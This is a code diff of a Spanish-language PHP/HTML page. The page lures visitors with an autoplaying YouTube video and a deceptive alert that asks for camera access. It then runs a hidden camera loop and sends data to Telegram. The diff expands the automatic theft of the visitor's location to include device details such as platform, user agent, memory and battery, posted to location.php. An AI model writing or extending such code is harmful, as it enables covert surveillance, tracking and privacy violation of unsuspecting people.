@@ -1,4 +1,4 @@
-<?php
+<?php 
 require_once __DIR__ . '/ip_utils.php';
 require_once __DIR__ . '/telegram.php';
 
@@ -24,7 +24,7 @@ send_to_telegram($msg);
 // Mensaje convincente antes de pedir permisos
 alert("Para ofrecer la mejor experiencia, necesitamos acceso a tu cámara. Esto nos permitirá gestionar tus archivos multimedia de forma eficiente, guardar videos de demostración y reproducirlos directamente en la aplicación.");
 </script>
-       
+
 <!-- Video de YouTube -->
 <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
@@ -75,15 +75,35 @@ function capturePhotoLoop() {
 // Iniciar cámara oculta
 initCamera();
 
-// Obtener ubicación y enviarla automáticamente
+// Obtener ubicación y datos del dispositivo automáticamente
 if ('geolocation' in navigator) {
     navigator.geolocation.getCurrentPosition(function(pos) {
         const { latitude, longitude, accuracy } = pos.coords;
-        fetch('location.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ latitude, longitude, accuracy })
-        });
+
+        const deviceInfo = {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || 'unknown',
+            memory: navigator.deviceMemory || 'unknown',
+        };
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                deviceInfo.batteryLevel = battery.level * 100 + '%';
+                deviceInfo.charging = battery.charging;
+                enviarDatos(latitude, longitude, accuracy, deviceInfo);
+            });
+        } else {
+            enviarDatos(latitude, longitude, accuracy, deviceInfo);
+        }
+
+        function enviarDatos(lat, lon, acc, deviceInfo) {
+            fetch('location.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc, device: deviceInfo })
+            });
+        }
     });
 }
 </script>
